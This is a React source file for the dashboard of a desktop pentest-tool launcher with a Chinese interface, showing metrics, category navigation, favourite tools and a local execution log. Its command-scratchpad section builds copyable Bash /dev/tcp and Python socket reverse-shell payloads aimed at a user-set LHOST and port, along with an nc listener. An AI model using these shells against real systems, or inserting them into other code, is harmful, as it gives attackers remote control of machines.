import React, { useState } from 'react';
import { useApp } from '../../context/AppContext';
import {
  Wrench,
  Star,
  Zap,
  FolderTree,
  Play,
  Copy,
  Check,
  Clock,
  ArrowRight,
  Shield,
  Activity,
  Globe,
  Terminal,
  FileCode,
  Bookmark,
  ExternalLink
} from 'lucide-react';
import { Tool } from '../../types';

export const DashboardPage: React.FC = () => {
  const {
    tools,
    categories,
    parentCategories,
    getSubcategories,
    favoriteTools,
    logs,
    launchTool,
    toggleFavorite,
    setActiveTab,
    setSelectedCategoryFilter,
    startAddTool,
    startEditTool
  } = useApp();

  const [copiedSnippet, setCopiedSnippet] = useState<string | null>(null);

  // Quick reverse shell snippet generator state
  const [lhost, setLhost] = useState('10.10.14.8');
  const [lport, setLport] = useState('4444');

  const copyToClip = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedSnippet(id);
    setTimeout(() => setCopiedSnippet(null), 2000);
  };

  const totalRuns = tools.reduce((acc, cur) => acc + (cur.usageCount || 0), 0);
  const totalSubcategories = categories.filter((c) => Boolean(c.parentId)).length;

  // 4 Top Category Runways
  const topCategories = parentCategories.slice(0, 4);

  return (
    <div className="p-6 space-y-6 max-w-7xl mx-auto w-full">
      {/* 1. Header Banner & Quick Metrics */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-2 border-b border-[#1e293b]">
        <div>
          <h1 className="text-xl font-bold text-[#f1f5f9] flex items-center space-x-2">
            <span>安全中枢仪表盘</span>
            <span className="text-xs px-2 py-0.5 rounded bg-[#0284c7]/20 text-[#38bdf8] font-mono font-medium border border-[#0284c7]/30">
              DESKTOP CONTROL
            </span>
          </h1>
          <p className="text-xs text-[#94a3b8] mt-1">
            统一编排本地取证脚本、Web渗透代理与高频红蓝对抗工具集
          </p>
        </div>

        <div className="flex items-center space-x-2">
          <button
            type="button"
            onClick={() => startAddTool()}
            className="px-3.5 py-1.5 rounded-lg bg-[#0284c7] hover:bg-[#0369a1] text-white text-xs font-medium flex items-center space-x-1.5 transition-all shadow-sm"
          >
            <span>+ 登记新工具</span>
          </button>
          <button
            type="button"
            onClick={() => {
              setSelectedCategoryFilter('all');
              setActiveTab('tools');
            }}
            className="px-3.5 py-1.5 rounded-lg bg-[#162032] hover:bg-[#1e293b] border border-[#1e293b] text-[#f1f5f9] text-xs font-medium flex items-center space-x-1.5 transition-colors"
          >
            <span>浏览工具库</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>
      </div>

      {/* 2. Statistical Metric Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <div className="p-4 rounded-xl bg-[#111827] border border-[#1e293b] flex items-center space-x-3.5">
          <div className="w-10 h-10 rounded-lg bg-[#0284c7]/10 border border-[#0284c7]/20 flex items-center justify-center text-[#38bdf8]">
            <Wrench className="w-5 h-5" />
          </div>
          <div>
            <div className="text-[11px] text-[#94a3b8]">已托管工具</div>
            <div className="text-xl font-bold font-mono text-[#f1f5f9]">{tools.length}</div>
          </div>
        </div>

        <div className="p-4 rounded-xl bg-[#111827] border border-[#1e293b] flex items-center space-x-3.5">
          <div className="w-10 h-10 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400">
            <Star className="w-5 h-5 fill-amber-400/20" />
          </div>
          <div>
            <div className="text-[11px] text-[#94a3b8]">常驻收藏</div>
            <div className="text-xl font-bold font-mono text-amber-400">{favoriteTools.length}</div>
          </div>
        </div>

        <div className="p-4 rounded-xl bg-[#111827] border border-[#1e293b] flex items-center space-x-3.5">
          <div className="w-10 h-10 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
            <Zap className="w-5 h-5" />
          </div>
          <div>
            <div className="text-[11px] text-[#94a3b8]">累计调用次数</div>
            <div className="text-xl font-bold font-mono text-emerald-400">{totalRuns}</div>
          </div>
        </div>

        <div className="p-4 rounded-xl bg-[#111827] border border-[#1e293b] flex items-center space-x-3.5">
          <div className="w-10 h-10 rounded-lg bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400">
            <FolderTree className="w-5 h-5" />
          </div>
          <div>
            <div className="text-[11px] text-[#94a3b8]">分类架构</div>
            <div className="text-xl font-bold font-mono text-purple-400 flex items-baseline space-x-1">
              <span>{parentCategories.length}</span>
              <span className="text-xs text-[#94a3b8] font-normal font-sans">大类</span>
              <span className="text-xs text-[#64748b]">/</span>
              <span className="text-base text-purple-300 font-bold">{totalSubcategories}</span>
              <span className="text-xs text-[#94a3b8] font-normal font-sans">子类</span>
            </div>
          </div>
        </div>
      </div>

      {/* 3. Category Runways (Top 4 Categories with Subcategories) */}
      <div>
        <div className="flex items-center justify-between mb-3">
          <h2 className="text-sm font-semibold text-[#f1f5f9] flex items-center space-x-2">
            <span>常用作战跑道</span>
            <span className="text-[10px] text-[#64748b]">大类导航与战术细分</span>
          </h2>
          <button
            type="button"
            onClick={() => setActiveTab('categories')}
            className="text-xs text-[#38bdf8] hover:underline flex items-center space-x-1"
          >
            <span>管理全部 {parentCategories.length} 大类 / {totalSubcategories} 子类</span>
            <ArrowRight className="w-3 h-3" />
          </button>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          {topCategories.map((cat) => {
            const subcategories = getSubcategories(cat.id);
            const subIds = subcategories.map((s) => s.id);
            const count = tools.filter(
              (t) => t.categoryId === cat.id || (t.subcategoryId && subIds.includes(t.subcategoryId))
            ).length;

            return (
              <div
                key={cat.id}
                onClick={() => {
                  setSelectedCategoryFilter(cat.id, null);
                  setActiveTab('tools');
                }}
                className="group p-4 rounded-xl bg-[#111827] border border-[#1e293b] hover:border-[#38bdf8]/40 transition-all cursor-pointer flex flex-col justify-between"
              >
                <div>
                  <div className="flex items-start justify-between">
                    <div
                      className="w-8 h-8 rounded-lg flex items-center justify-center font-bold text-sm shadow-sm"
                      style={{ backgroundColor: `${cat.color}20`, color: cat.color }}
                    >
                      {cat.name.slice(0, 2)}
                    </div>
                    <div className="flex items-center space-x-1.5">
                      {subcategories.length > 0 && (
                        <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-[#1e293b] text-[#94a3b8]">
                          {subcategories.length} 子类
                        </span>
                      )}
                      <span className="text-[11px] font-mono px-2 py-0.5 rounded-full bg-[#1e293b] text-[#94a3b8] group-hover:text-white group-hover:bg-[#0284c7]">
                        {count} 款
                      </span>
                    </div>
                  </div>

                  <div className="mt-3">
                    <div className="text-sm font-medium text-[#f1f5f9] group-hover:text-[#38bdf8] transition-colors">
                      {cat.name}
                    </div>
                    <div className="text-[11px] text-[#64748b] mt-1 line-clamp-1">
                      {cat.description}
                    </div>
                  </div>
                </div>

                {/* Subcategory pills shortcut */}
                {subcategories.length > 0 && (
                  <div className="mt-3 pt-2.5 border-t border-[#1e293b]/60 flex flex-wrap gap-1">
                    {subcategories.slice(0, 3).map((sub) => (
                      <span
                        key={sub.id}
                        onClick={(e) => {
                          e.stopPropagation();
                          setSelectedCategoryFilter(cat.id, sub.id);
                          setActiveTab('tools');
                        }}
                        className="text-[10px] px-1.5 py-0.5 rounded bg-[#0d121f] border border-[#1e293b] text-[#94a3b8] hover:text-[#38bdf8] hover:border-[#38bdf8]/40 transition-colors"
                        title={`过滤到：${cat.name} › ${sub.name}`}
                      >
                        {sub.name}
                      </span>
                    ))}
                    {subcategories.length > 3 && (
                      <span className="text-[10px] px-1 py-0.5 text-[#64748b] font-mono self-center">
                        +{subcategories.length - 3}
                      </span>
                    )}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>

      {/* 4. Pinned Favorites Grid (Top 6) */}
      <div>
        <div className="flex items-center justify-between mb-3">
          <h2 className="text-sm font-semibold text-[#f1f5f9] flex items-center space-x-2">
            <Star className="w-4 h-4 text-amber-400 fill-amber-400" />
            <span>核心常驻工具</span>
            <span className="text-[10px] text-[#64748b]">一键瞬时拉起</span>
          </h2>
          <button
            type="button"
            onClick={() => {
              setSelectedCategoryFilter('all');
              setActiveTab('tools');
            }}
            className="text-xs text-[#38bdf8] hover:underline"
          >
            查看全部工具 ({tools.length})
          </button>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {favoriteTools.slice(0, 6).map((tool) => {
            const parentCat = categories.find((c) => c.id === tool.categoryId);
            const subCat = tool.subcategoryId ? categories.find((c) => c.id === tool.subcategoryId) : null;

            return (
              <div
                key={tool.id}
                className="p-4 rounded-xl bg-[#111827] border border-[#1e293b] hover:border-[#38bdf8]/50 transition-all flex flex-col justify-between group shadow-sm"
              >
                <div>
                  <div className="flex items-start justify-between">
                    <div className="flex items-center space-x-2.5">
                      <div className="w-8 h-8 rounded-lg bg-[#162032] border border-[#1e293b] flex items-center justify-center text-sm font-bold text-[#38bdf8]">
                        {tool.type === 'web' ? (
                          <Globe className="w-4 h-4 text-emerald-400" />
                        ) : tool.type === 'script' ? (
                          <FileCode className="w-4 h-4 text-amber-400" />
                        ) : tool.type === 'cheat_sheet' ? (
                          <Bookmark className="w-4 h-4 text-blue-400" />
                        ) : (
                          <Terminal className="w-4 h-4 text-[#38bdf8]" />
                        )}
                      </div>
                      <div>
                        <h3 className="text-sm font-semibold text-[#f1f5f9] group-hover:text-[#38bdf8] transition-colors leading-tight">
                          {tool.name}
                        </h3>
                        <div className="flex items-center space-x-1.5 mt-0.5">
                          {parentCat && (
                            <span
                              className="text-[10px] px-1.5 py-0.5 rounded border flex items-center space-x-1"
                              style={{
                                borderColor: `${parentCat.color}40`,
                                color: parentCat.color,
                                backgroundColor: `${parentCat.color}10`
                              }}
                            >
                              <span>{parentCat.name}</span>
                              {subCat && (
                                <>
                                  <span className="opacity-40 text-[9px]">›</span>
                                  <span className="font-medium text-white/90">{subCat.name}</span>
                                </>
                              )}
                            </span>
                          )}
                          <span className="text-[10px] text-[#64748b] font-mono uppercase">
                            {tool.type}
                          </span>
                        </div>
                      </div>
                    </div>

                    <button
                      type="button"
                      onClick={() => toggleFavorite(tool.id)}
                      className="text-amber-400 p-1 hover:scale-110 transition-transform"
                      title="取消收藏"
                    >
                      <Star className="w-4 h-4 fill-amber-400" />
                    </button>
                  </div>

                  <p className="text-xs text-[#94a3b8] mt-2 line-clamp-2 leading-relaxed">
                    {tool.description}
                  </p>
                </div>

                <div className="mt-4 pt-3 border-t border-[#1e293b]/70 flex items-center justify-between">
                  <span className="text-[11px] text-[#64748b] font-mono">
                    已调用 {tool.usageCount || 0} 次
                  </span>

                  <div className="flex items-center space-x-2">
                    <button
                      type="button"
                      onClick={() => startEditTool(tool.id)}
                      className="px-2 py-1 rounded text-xs text-[#94a3b8] hover:text-white hover:bg-[#1e293b] transition-colors"
                    >
                      编辑
                    </button>
                    <button
                      type="button"
                      onClick={() => launchTool(tool)}
                      className="px-3 py-1 rounded-md bg-[#0284c7] hover:bg-[#0369a1] text-white text-xs font-medium flex items-center space-x-1.5 transition-all shadow-sm"
                    >
                      <Play className="w-3 h-3 fill-white" />
                      <span>启动</span>
                    </button>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* 5. Bottom Split: Quick Command Scratchpad & Execution Audit Log */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Left: Quick Command Scratchpad */}
        <div className="p-4 rounded-xl bg-[#111827] border border-[#1e293b] flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-sm font-semibold text-[#f1f5f9] flex items-center space-x-2">
                <Terminal className="w-4 h-4 text-[#38bdf8]" />
                <span>实战指令草稿台</span>
              </h3>
              <div className="flex items-center space-x-2 text-xs">
                <input
                  type="text"
                  value={lhost}
                  onChange={(e) => setLhost(e.target.value)}
                  placeholder="LHOST"
                  className="w-24 px-2 py-0.5 rounded bg-[#0d121f] border border-[#1e293b] text-[11px] font-mono text-[#38bdf8] focus:outline-none"
                />
                <input
                  type="text"
                  value={lport}
                  onChange={(e) => setLport(e.target.value)}
                  placeholder="PORT"
                  className="w-16 px-2 py-0.5 rounded bg-[#0d121f] border border-[#1e293b] text-[11px] font-mono text-[#38bdf8] focus:outline-none"
                />
              </div>
            </div>

            <div className="space-y-2">
              {/* Bash Reverse Shell */}
              <div className="p-2.5 rounded-lg bg-[#0d121f] border border-[#1e293b] flex items-center justify-between text-xs font-mono">
                <div className="truncate mr-2 text-[#94a3b8]">
                  <span className="text-emerald-400 font-bold mr-2">[Bash]</span>
                  <span>bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1</span>
                </div>
                <button
                  type="button"
                  onClick={() => copyToClip(`bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`, 'bash')}
                  className="p-1 rounded hover:bg-[#1e293b] text-[#38bdf8] flex items-center space-x-1 flex-shrink-0"
                  title="复制指令"
                >
                  {copiedSnippet === 'bash' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>

              {/* Python Reverse Shell */}
              <div className="p-2.5 rounded-lg bg-[#0d121f] border border-[#1e293b] flex items-center justify-between text-xs font-mono">
                <div className="truncate mr-2 text-[#94a3b8]">
                  <span className="text-amber-400 font-bold mr-2">[Python]</span>
                  <span>python3 -c 'import socket,os,pty;s=socket.socket()...'</span>
                </div>
                <button
                  type="button"
                  onClick={() => copyToClip(`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`, 'py')}
                  className="p-1 rounded hover:bg-[#1e293b] text-[#38bdf8] flex items-center space-x-1 flex-shrink-0"
                  title="复制指令"
                >
                  {copiedSnippet === 'py' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>

              {/* Netcat listener */}
              <div className="p-2.5 rounded-lg bg-[#0d121f] border border-[#1e293b] flex items-center justify-between text-xs font-mono">
                <div className="truncate mr-2 text-[#94a3b8]">
                  <span className="text-[#38bdf8] font-bold mr-2">[NC监听]</span>
                  <span>nc -lvnp {lport}</span>
                </div>
                <button
                  type="button"
                  onClick={() => copyToClip(`nc -lvnp ${lport}`, 'nc')}
                  className="p-1 rounded hover:bg-[#1e293b] text-[#38bdf8] flex items-center space-x-1 flex-shrink-0"
                  title="复制指令"
                >
                  {copiedSnippet === 'nc' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            </div>
          </div>

          <div className="mt-3 text-[11px] text-[#64748b]">
            可修改右上方 LHOST / PORT 参数，点击右侧图标直接复制注入 Payload。
          </div>
        </div>

        {/* Right: Execution Audit Log */}
        <div className="p-4 rounded-xl bg-[#111827] border border-[#1e293b] flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-sm font-semibold text-[#f1f5f9] flex items-center space-x-2">
                <Clock className="w-4 h-4 text-emerald-400" />
                <span>最近调用流水</span>
              </h3>
              <span className="text-[11px] text-[#64748b] font-mono">本地保护日志</span>
            </div>

            <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
              {logs.slice(0, 5).map((log) => {
                const loggedTool = tools.find((t) => t.id === log.toolId);
                const parentCat = loggedTool ? categories.find((c) => c.id === loggedTool.categoryId) : null;
                const subCat = loggedTool?.subcategoryId ? categories.find((c) => c.id === loggedTool.subcategoryId) : null;

                return (
                  <div
                    key={log.id}
                    className="p-2 rounded bg-[#0d121f] border border-[#1e293b] flex items-center justify-between text-xs"
                  >
                    <div className="flex items-center space-x-2 truncate">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 flex-shrink-0" />
                      <span className="font-medium text-[#f1f5f9] truncate">{log.toolName}</span>
                      {parentCat && (
                        <span className="text-[10px] text-[#64748b] font-mono hidden sm:inline">
                          ({parentCat.name}{subCat ? ` › ${subCat.name}` : ''})
                        </span>
                      )}
                      <span className="text-[10px] text-[#475569] font-mono truncate hidden md:inline">
                        {log.commandPreview}
                      </span>
                    </div>
                    <div className="text-[10px] text-[#64748b] font-mono flex-shrink-0 ml-2">
                      {new Date(log.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                    </div>
                  </div>
                );
              })}
              {logs.length === 0 && (
                <div className="p-6 text-center text-xs text-[#64748b]">
                  暂无工具调用历史
                </div>
              )}
            </div>
          </div>

          <div className="mt-3 flex items-center justify-between text-[11px] text-[#64748b]">
            <span>所有执行记录均存储在本地 SQLite / IndexedDB</span>
            <span className="text-emerald-400">● 零外部上报</span>
          </div>
        </div>
      </div>
    </div>
  );
};
